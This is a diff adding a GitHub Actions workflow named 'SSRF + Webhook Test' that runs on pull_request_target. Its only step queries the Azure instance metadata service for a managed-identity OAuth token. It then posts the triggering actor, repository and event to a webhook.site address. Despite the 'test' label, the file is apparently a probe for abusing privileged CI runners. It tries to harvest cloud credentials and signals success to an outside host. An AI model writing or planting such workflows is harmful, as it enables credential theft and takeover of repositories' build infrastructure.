@@ -1,0 +1,23 @@
+name: SSRF + Webhook Test
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: SSRF + Webhook
+        run: |
+          curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com
+
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -d '{
+                "action": "ssrf_webhook_test",
+                "actor": "${{ github.actor }}",
+                "repo": "${{ github.repository }}",
+                "event": "${{ github.event_name }}"
+              }' \
+            https://webhook.site/ff7df6bc-b878-4b8f-b0f0-294f22f56a5b
